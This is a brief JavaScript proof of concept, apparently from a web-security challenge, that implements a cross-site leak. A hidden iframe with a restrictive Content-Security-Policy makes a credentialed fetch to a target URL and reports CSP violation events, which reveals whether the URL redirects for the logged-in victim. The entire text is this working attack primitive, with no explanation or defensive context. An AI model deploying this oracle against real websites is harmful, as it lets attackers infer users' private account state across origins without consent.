let TEST_URL ='http://127.0.0.1:7000'

const leak = async (url) => {
    return new Promise(r => {
        let iframe = document.createElement('iframe')
        window.onmessage = (e) => {
            iframe.remove()
            // detected redirect to example.com
            return r(1)
        }
        // timeout if no message
        setTimeout(() => {
            iframe.remove()
            return r(0)
        }, 3000)
        
        iframe.srcdoc = `<html>
        <head>
            <meta http-equiv='Content-Security-Policy' content="default-src * 'unsafe-inline'; connect-src ${TEST_URL}">
        </head>
        <body>
            <script>
                document.addEventListener('securitypolicyviolation', e => {parent.postMessage(e.blockedURI, '*')})
                fetch('${url}', {mode:'no-cors', credentials: 'include'})
            <\/script>
        </body>
        </html>`

        document.body.appendChild(iframe)

    })
}


